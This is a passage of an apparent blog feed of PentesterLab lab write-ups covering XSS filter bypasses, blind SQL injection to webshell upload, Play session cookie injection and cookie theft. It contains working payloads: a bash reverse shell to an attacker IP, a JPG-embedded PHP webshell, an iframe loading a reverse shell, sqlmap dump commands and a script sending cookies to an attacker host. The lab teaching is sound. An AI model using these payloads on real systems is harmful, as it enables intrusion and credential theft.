</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the script will stop when &ldquo;<em>script</em>&rdquo; is detected, so the previous methods will not work any more. However there are plenty of methods available in HTML to trigger an event without &ldquo;<em>script</em>&rdquo;, there are two examples as follow.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;img src="xxxx" onerror="alert(1)"&gt;</code></p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;div onmousemove="alert(1)" src="xxxx"&gt;</code></p>

<p>There are more <a href="http://www.w3schools.com/tags/ref_eventattributes.asp">event triggers</a> available in HTML.</p>

<h2>Example 5</h2>

<p>Code review:</p>

<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/alert/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer filtered keyword &ldquo;<em>alert</em>&rdquo;, obviously there are many methods to exploit the vulnerability without using &ldquo;<em>alert</em>&rdquo; function.
such as:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;iframe width=0 height=0 src="http://10.10.10.131/sh5555.php"&gt;</code></p>

<p>Here <strong><em>sh5555.php</em></strong> is PHP reverse shell (php/reverse_php, LPORT is 5555) generated by msfpayload.</p>

<p>Still, there are methods to bypass input validation to use &ldquo;<em>alert</em>&rdquo; function.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>

<h2>Example 6</h2>

<figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello </span>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'><span class="x">  </span><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time user input has been included in &ldquo;<code>&lt;script&gt;</code>&rdquo; tab, so we do not need input &ldquo;<code>&lt;script&gt;</code>&rdquo; and just close the first double quote and use &ldquo;//&rdquo; to comment the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example6.php?name=";alert(1);//</code></p>

<h2>Example 7</h2>

<figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello </span>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'><span class="x">  </span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer use PHP function &ldquo;<em><a href="http://php.net/htmlentities">htmlentities()</a></em>&rdquo; to deal with user input, the &ldquo;<em>htmlentities()</em>&rdquo; function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function &ldquo;<em>htmlentities()</em>&rdquo; which default only use flags &ldquo;<strong>ENT_COMPAT | ENT_HTML401</strong>&rdquo;, &ldquo;<a href="http://php.net/htmlentities">ENT_COMPAT</a>&rdquo; flag only convert double quotes and leave single quotes alone. So in this case, the following payload will work fine:</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example7.php?name=';alert(1);//</code></p>

<h2>Example 8</h2>

<figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;HELLO &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time the developer did correct validation on parameter &ldquo;<em>name</em>&rdquo;, but the problem happened on &ldquo;<em>$_SERVER[PHP_SELF]</em>&rdquo;.
Due to there is no validation on parameter &ldquo;<strong><a href="http://php.net/manual/en/reserved.variables.server.php">PHP_SELF</a></strong>&rdquo; which is controlled by user, I still can inject XSS and exploit the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example8.php/" onmouseover="alert(1)</code></p>

<h2>Example 9</h2>

<figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time is <a href="https://www.owasp.org/index.php/DOM_Based_XSS">DOM-based XSS</a>. the user input is in URL after &ldquo;#&rdquo;, so just put payload after &ldquo;#&rdquo; in URL will trigger the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>

<p>Reference:</p>

<p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] From SQL to Shell II]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii/"/>
    <updated>2015-05-12T06:33:13-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii</id>
    <content type="html"><![CDATA[<p>This is an upgraded version from previous course &ldquo;<a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell'>From SQL Injection to Shell</a>&rdquo; which is talking about how to exploit basic error-based SQL injection vulnerability, in this course &ldquo;From SQL Injection to Shell II&rdquo;, more advanced techniques will be used to exploit complicated Blind-SQL injection vulnerability.</p>

<p>More information and ISO download please check <a href='https://ptl.io/from_sqli_to_shell_II_i386.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 3 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/127586134?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Interacted with the web server, found the it is Nginx server and also found admin login page. [Firefox]</li>
<li>Use sqlmap to test and exploit the blind-SQL injection vulnerability which is happened in HTTP header "X-Forwarded-for". [sqlmap]</li>
<li>In order to bypass the file validation to upload php webshell, the attacker use exiftool to store php code hidden in a real jpg image. [exiftool]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://sqlmap.org/'>sqlmap</a></li>
<li><a href='http://www.sno.phy.queensu.ca/~phil/exiftool/'>exiftool</a></li>
</ul>


<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>pdf</a>, we know that we need to find and exploit a blind SQL injection vulnerability to dump and crack the web admin&rsquo;s password. After login to the dashboard, we need to find a way to bypass file validation function and upload image with php webshell.</p>

<h3>Detect and Exploit Blind SQL injection in HTTP header 'X-Forwarded-for'</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. When the web page has been loaded, my firefox addon &ldquo;<a href='https://wappalyzer.com/'>wappalyzer</a>&rdquo; show the web server is <a href='http://nginx.org/en/'>Nginx</a> (which has mis-configuration vulnerability will be used later to interpret image file as PHP). Also there is &ldquo;Admin&rdquo; link will access to admin dashboard login page.</p>

<p>Next the attacker uses SQLMAP to detect and exploit the blind SQL injection.</p>

<p>1st detect and fetch all the databases from the server.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --dbs</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/1.png"></p>

<p>2nd fetch all the tables belong to database &ldquo;photoblog&rdquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --tables -D photoblog --smart --batch</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/2.png"></p>

<p>3rd dump table &ldquo;user&rdquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://10.10.10.129/" --headers="X-forwarded-for:1*" --dump -T users -D photoblog --smart --batch</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/3.png"></p>

<p>Here we can see that login username is &ldquo;<font color='red'>admin</font>&rdquo; and password is &ldquo;<font color='red'>P4ssw0rd</font>&rdquo;</p>

<p>After login to the dashboard, there is file upload function (the URL is <a href="http://10.10.10.129/admin/new.php">http://10.10.10.129/admin/new.php</a>)</p>

<p>After many times Trail and error, I found the only real image (.png, .jpg and .gif) with correct content can be uploaded, then the image file will be renamed and saved in &ldquo;/admin/uploads/&rdquo;.</p>

<p>However, Nginx has a mis-configure vulnerability which can be exploited to make the shell executed.</p>

<p>In order to test if the target server has the mis-configure vulnerability, I tried the following commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /admin/uploads/1431253877.jpg HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n" | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>


<p>and</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /admin/uploads/1431253877.jpg/test.php HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n" | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/4.png"></p>

<p>From the result above, we can see that the difference in the value of &ldquo;Content-Type&rdquo; between the two responses. the second response shows that the file has been interpreted as PHP code.</p>

<p>Now I inject the classic single-line php shell (&lt;?php system($_GET[&lsquo;cmd&rsquo;]); ?>) into an image by using &ldquo;exiftool&rdquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool "-comment&lt;=shell.php" img.jpg</span></code></pre></td></tr></table></div></figure>


<p>Then I set up NC on my Kali Linux to listen on port 5555, after uploaded the file and exploit the Nginx mis-configure vulnerability, I got a shell back.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/5.png"></p>

<p>Then I use the following command to get a better shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/bash -i >& /dev/tcp/10.10.10.131/4444 0>&1</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fromsqltoshell2/6.png"></p>

<p>Done.</p>

<h3>Code Review</h3>


<p>The vulnerable code is in the file stats.php</p>

<figure class='code'><figcaption><span>stats.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$ip</span><span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$results</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM stats where ip=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span>
</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;UPDATE stats set count=count+1 where ip=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO stats (ip, count) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;,1);&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>As we can see above, there is no input validation or filter against the value of &ldquo;<font color='red'>HTTP_X_FORWARDED_FOR</font>&rdquo; which is saved in variable &ldquo;ip&rdquo; and used in SQL statement directly to make the vulnerability happened.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Play Session Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection/"/>
    <updated>2015-05-09T07:34:13-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://ptl.io/play_session_injection.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 3 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/103324009?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Register two new accounts which username are test and test2, analyze both session cookies to figure out the cookie’s construction rules. Inject evil codes into the session cookie to bypass the validation schedule. [firebug / Burp proxy]</li>
<li>For goal one, inject “admin:1” to login with administration privilege. For goal two, inject “user:admin1” to login as admin user “admin1” with administration privilege. [Burp proxy]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://getfirebug.com/'>Firebug</a></li>
<li><a href='http://portswigger.net/burp/'>Burp suite</a></li>
</ul>


<h2>Walkthrough</h2>


<p>By reading the training <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>pdf</a>, we know that there is a session injection in Play framework. (In this exercise, we have two goals to achieve. First one is to login as anyone but have administration privilege; Second one is to login as administrator name is “admin1”).</p>

<h3>Find the Play session cookie</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that this there are two goals need to be achieved. First one is create a user with admin privilege and the second one is to login as the user “admin1”. On the top left hand side, is the navigation menu to “Register”(which asks the attacker to register a new account), “Login”(which asks the attacker to login). The attacker tried to register a new account which the name is “test”, then run Burp proxy and login with the “test” account. After checking the request intercepted by Burp proxy, the attacker found that the session information is saved in the cookie called “PLAY_SESSION”. The cookie value is in the following format:<br></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PLAY_SESSION=xxx(some hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3Atest%00</span></code></pre></td></tr></table></div></figure>


<p>In order to analyze the session cookie, the attacker register another new account which name is &ldquo;test2&rdquo; and the session cookie value is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PALY_SESSION=xxx(some hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3Atest2%00</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that the username would be an injection point. And the encoding format is “<font color='blue'>%00key%3Avalue%00</font>” (here %3A is URL encoded “:” and %00 means NULL for termination).</p>

<h3>First goal is to login as anyone but have admin privilege</h3>


<p>In order to login as any user (here the attacker choose user “test2”) with admin privilege, the attacker have to inject evil code into the Play session. As we found that username is an injection point in the session, the attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00admin%3A1</font>%00</font></p>


<p>Here admin%3A1 means “admin:1” which usually indicates admin privilege). In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00admin%3A1</font>”. (note: Burp proxy is needed here to fulfill this injection.</p>

<h3>Second goal is to login as admin user “admin1”</h3>


<p>Same as above, in order to login as admin user “admin1”, the attacker have to inject evil code into the Play session. The attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00user%3Aadmin1</font>%00</font></p>


<p></p>

<p>In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00user%3Aadmin1</font>”. (note: Burp proxy is needed here to fulfill this injection)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] XSS and MySQL File]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file/"/>
    <updated>2015-05-09T01:28:19-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file'>here</a>. The <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 2 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/114390804?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering [whatweb]</li>
<li>Web file system structure detection [DirBuster]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Set up the attacker’s server in order to Exploit the XSS vulnerability and get admin session cookie. [socat]</li>
<li>After obtain the admin session cookie, log in as administrator and then found SQL injection vulnerable point.</li>
<li>Exploit SQL injection to upload web shell.</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='http://www.morningstarsecurity.com/research/whatweb'>whatweb</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://www.dest-unreach.org/socat/'>socat</a></li>
</ul>




<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>pdf</a>, we know that we need to find and exploit a XSS vulnerability to log in as admin. After that, we need to find and exploit a MySQL injection vulnerability in order to upload webshell and control the target server.</p>

<h3>Find and Exploit the XSS vulnerability</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that there are two goals need to be achieved. First one is log in as administrator and then upload webshell into the target server.</p>

<p>After browsing around the target web site, the attacker found the comment system might be vulnerable to XSS. The attacker try to test if there are XSS vulnerability by using &ldquo;<font color='red'>1337′&rdquo;>&lt;</font>“. The result is a little excited. the server end dose not filter special characters. So the attacker just exploit the XSS and obtain the cookie with admin privilege.</p>

<p>write the following XSS exploit code into the comments:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;http://192.168.1.129/?&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="s1">&#39;&quot;/&gt;&#39;</span><span class="p">);</span> <span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Set up the attacker’s machine to listen port 80 by using followed socat command.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>socat TCP-LISTEN:80,reuseaddr,fork –
